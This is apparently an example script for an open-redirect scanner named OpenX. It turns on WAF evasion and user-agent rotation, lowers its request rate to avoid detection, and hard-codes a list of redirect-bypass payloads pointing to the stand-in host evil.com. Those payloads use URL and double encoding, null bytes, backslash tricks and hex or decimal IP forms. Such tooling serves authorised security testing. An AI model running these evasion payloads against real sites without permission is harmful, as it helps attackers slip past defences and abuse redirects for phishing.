#!/usr/bin/env python3
"""
OpenX Example: WAF Evasion Scan
This example demonstrates how to use OpenX with WAF evasion techniques
"""

import os
import sys
import asyncio
import argparse
from pathlib import Path

# Add parent directory to path to import OpenX modules
sys.path.append(str(Path(__file__).parent.parent))

from core.scanner import Scanner
from payloads.payload_manager import PayloadManager
from reports.report_generator import ReportGenerator
from config.config import Config
from utils.helpers import read_urls_from_file, save_results_to_file
import fake_useragent_data

async def main():
    """Main function to demonstrate OpenX with WAF evasion techniques"""
    
    # Parse command line arguments
    parser = argparse.ArgumentParser(description="OpenX WAF Evasion Scan Example")
    parser.add_argument("-u", "--url", help="Single URL to scan")
    parser.add_argument("-l", "--url-list", help="File containing URLs to scan")
    parser.add_argument("-o", "--output", help="Output file for results")
    parser.add_argument("-f", "--format", default="html", choices=["text", "json", "html"], 
                        help="Output format (text, json, html)")
    parser.add_argument("--proxy", help="Proxy URL (e.g., http://127.0.0.1:8080)")
    parser.add_argument("--delay", type=float, default=1.0, 
                        help="Delay between requests in seconds")
    args = parser.parse_args()
    
    if not args.url and not args.url_list:
        parser.error("Either --url or --url-list is required")
    
    # Load configuration
    config = Config()
    config.load_default_config()
    
    # Configure WAF evasion settings
    config.set('waf_evasion.enabled', True)
    config.set('waf_evasion.techniques', [
        'url_encoding',
        'double_encoding',
        'case_randomization',
        'path_manipulation'
    ])
    
    # Configure other settings
    config.set('general.verbose', True)
    config.set('performance.concurrency', 3)  # Lower concurrency to avoid detection
    config.set('performance.delay', args.delay)  # Add delay between requests
    
    # Configure user agent settings
    config.set('user_agent.rotation', True)
    
    # Configure proxy if provided
    if args.proxy:
        config.set('proxy.url', args.proxy)
    
    # Initialize user agent manager with WAF evasion agents
    ua_manager = fake_useragent_data.UserAgentManager()
    
    # Print available user agent categories
    print("Available User Agent Categories:")
    for category in ua_manager.user_agents:
        if category != 'all':
            print(f"  - {category} ({len(ua_manager.user_agents[category])} agents)")
    
    # Get a WAF evasion user agent
    waf_ua = ua_manager.get_waf_evasion()
    print(f"\nUsing WAF evasion user agent: {waf_ua}")
    
    # Initialize payload manager with custom target domains
    payload_manager = PayloadManager(config)
    payload_manager.set_target_domains(['example.com', 'evil.com'])
    
    # Load custom payloads
    custom_payloads_path = os.path.join(os.path.dirname(os.path.dirname(__file__)), 
                                        'payloads', 'custom_payloads.txt')
    if os.path.exists(custom_payloads_path):
        payload_manager.load_custom_payloads(custom_payloads_path)
    
    # Add WAF evasion payloads
    waf_evasion_payloads = [
        # URL encoding variations
        "https://%65%76%69%6c.com",  # evil.com URL encoded
        "https://%65vil.com",         # partial URL encoding
        "https://%2f%2fevil.com",     # double slash encoding
        
        # Case variations
        "https://eViL.com",
        "https://Evil.Com",
        
        # Backslash variations
        "https://evil.com\\@example.com",
        "https://example.com\\@evil.com",
        
        # Null byte injection
        "https://evil.com%00.example.com",
        "https://example.com%00@evil.com",
        
        # Double encoding
        "https://example.com@%2565%2576%2569%256c.com",
        
        # Unicode normalization
        "https://evil.com%E3%80%82",  # Unicode full stop
        
        # Domain obfuscation
        "https://evil.com.example.com",
        "https://example.com.evil.com",
        
        # IP address variations
        "https://127.0.0.1",
        "https://0x7f.0x0.0x0.0x1",   # Hex encoding
        "https://2130706433",         # Decimal encoding
    ]
    
    for payload in waf_evasion_payloads:
        payload_manager.add_custom_payload(payload)
    
    # Initialize scanner
    scanner = Scanner(config, payload_manager)
    
    # Get URLs to scan
    urls = []
    if args.url:
        urls.append(args.url)
    elif args.url_list:
        urls = read_urls_from_file(args.url_list)
    
    # Print scan information
    print(f"\nStarting WAF evasion scan with {len(urls)} URLs")
    print(f"Loaded {len(payload_manager.get_payloads())} payloads")
    print(f"Using delay of {args.delay} seconds between requests")
    if args.proxy:
        print(f"Using proxy: {args.proxy}")
    
    # Run the scan
    results = await scanner.scan_urls(urls)
    
    # Get scan statistics
    stats = scanner.get_scan_stats()
    
    # Print scan summary
    print("\nScan Summary:")
    print(f"Total URLs: {stats['total_urls']}")
    print(f"Vulnerable URLs: {stats['vulnerable_count']}")
    print(f"Scan Duration: {stats['scan_duration']:.2f} seconds")
    
    # Generate report
    if args.output:
        report_generator = ReportGenerator(config)
        report = report_generator.generate_report(results, stats, args.output, args.format)
        print(f"\nReport saved to: {args.output}")
    
    # Return the results
    return results, stats

if __name__ == "__main__":
    # Run the main function
    asyncio.run(main())
